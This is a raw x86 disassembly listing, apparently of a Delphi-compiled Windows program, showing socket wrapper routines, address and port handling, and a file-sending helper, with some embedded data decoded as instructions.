mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45b7ac
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cecd
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_45cef4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_45d2ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403e54
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b8
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408be0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403ea8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d2f5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
jmp [ eax * 4 + jump_table_45cf34 ]
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059b8
sub_45d2fc
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_45d32c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404304
xor eax eax
push ebp
push sub_45d374
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d37b
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_45d384
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45d3a9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d3b0
retn
sub_45d3bc
or ah dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
aam 0x45
add [ eax ] cl
add [ eax ] eax
add [ ebx + ecx * 8 + 0x334c0045 ] bl
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
adc al 0xe3
dec esp
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0xd4004030
add [ esp + edx * 2 ] dl
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
aad 0x45
add al bl
fiadd [ ebp ]
sbb bh 0x45
add [ eax - 0x24 ] dl
inc ebp
add [ eax ] dl
aad 0x45
add [ esi + edx * 8 - 0x28c3ffbb ] ch
inc ebp
add [ eax - 0x4bffba29 ] ch
xlat
inc ebp
add [ eax + ebx * 8 ] al
inc ebp
add [ eax + 0x600045d8 ] dh
fadd [ ebp ]
mov al 0xdc
inc ebp
add [ eax - 0x67ffba23 ] bh
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dl
imul esi [ ebx + 0x74 ] 0x646e6957
outsd
ja r-xdata
fadd [ ebp ]
in al dx
fadd [ ebp ]
movsb [ edi ] [ esi ]
fadd [ ebp ]
rcr dh 0x45
add ah cl
fiadd [ ebp ]
clc
fadd [ ebp ]
adc al 0xd9
inc ebp
add [ eax - 0x57ffba26 ] dl
fild [ ebp ]
mov al 0xd8
inc ebp
add [ eax - 0x28 ] ah
inc ebp
add [ eax - 0x47ffba24 ] dh
fld [ ebp ]
cwde
lea eax [ eax ]
jl r-xdata
inc ebp
add [ edx - 0x1c83ffbb ] ch
inc ebp
add [ eax ] dl
jecxz r-xdata
inc eax
add [ ebx ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aad 0x45
add [ eax ] dl
add [ eax ] al
add [ eax ] cl
int3
sub_45d4d5
fild [ ebp ]
xor ah bl
inc ebp
add [ eax + 0x400045dc ] al
loope r-xdata
add [ eax + 0x740045e3 ] dh
fadd [ ebp ]
dec esp
loope r-xdata
rcl [ ebp + 0x68 ] 0xae
add ah ch
loope r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d5b5
lea eax [ ebp - 0x194 ]
call sub_403e54
retn
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_45ca10
inc eax
jne r-xdata
aad 0x45
add [ edi + edi * 8 + 0x30 ] ah
add [ edx - 0x2a03ffbb ] cl
inc ebp
add [ eax + 0x45 ] ah
add [ edi ] cl
push esp
dec ecx
push ebx
je r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x194 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
xchg ebp eax
insb
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_45ced4
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45d5ae
push [ fs : eax ]
add esp 0xfffffff0
call sub_403428
sub_45d5d4
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45d2fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_45d5fc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_45d690
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_407d78
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_407d78
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_407d78
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_407d78
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_4041d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d697
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403e78
retn
sub_45d6a3
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_45d72b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_403ea8
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d732
lea eax [ ebp - 0x1c ]
call sub_403e54
retn
sub_45d73c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_404114
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_45d32c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45d7b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_45d32c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45d804
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_404314
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_45ce20
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_45d860
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_404314
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_40404c
or edx 0xffffffff
mov eax esi
call sub_45ce20
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_45d8b0
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_4044a0
mov eax [ ebx ]
call sub_404114
push eax
mov eax [ ebx ]
call sub_404314
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_404314
mov edx eax
mov eax ebx
call sub_40404c
pop ebx
retn
sub_45d8f8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_45d914
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_45d99f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_403ea8
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d9a6
lea eax [ ebp - 0x1c ]
call sub_403e54
retn
sub_45d9b0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_413ed0
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_413c10
add ebx 0x4
dec esi
jne r-xdata
sub_45d9ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45da81
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45da88
lea eax [ ebp - 0xc ]
call sub_403e54
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_413d6c
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_45da90
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402b18
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402b18
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402b18
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_45d9ec
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_45d9ec
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_45d9ec
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_45d9b0
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_45d9b0
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_45d9b0
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45dba8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_45dbc4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402b18
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_45d32c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_45dc30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_45dc50
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0xc ] eax
sub_45dcb0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_45dd7d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_4036d0#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_407eb4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dd84
lea eax [ ebp - 0x10 ]
call sub_403e54
retn
sub_45dd25
add [ eax ] eax
add [ eax ] al
mov ah 0x73
inc eax
add [ ecx ] dh
fld [ ebp ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
call sub_40390c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dd84
lea eax [ ebp - 0x10 ]
call sub_403e54
retn
sub_45dda3
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_45dead
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404e14
xor eax eax
push ebp
push sub_45de72
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_40404c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_404e50
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45deb4
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403e78
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404e14
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_40404c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_45de77
mov eax [ ebp - 0x4 ]
call sub_403104
call sub_40390c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45deb4
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403e78
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404e14
retn
sub_45ded8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_45df72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_404314
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_45ce20
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45df79
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403e78
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_45df80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_45df9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404304
xor eax eax
push ebp
push sub_45e052
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45e035
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e03c
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_45e064
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404304
xor eax eax
push ebp
push sub_45e127
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45e880
mov eax [ ebp - 0x8 ]
call sub_407eb4
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45e880
mov eax [ ebp - 0xc ]
call sub_407eb4
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45e880
mov eax [ ebp - 0x10 ]
call sub_407eb4
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_45e880
mov eax [ ebp - 0x14 ]
call sub_407eb4
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e12e
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403e78
retn
sub_45e14c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45e1da
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
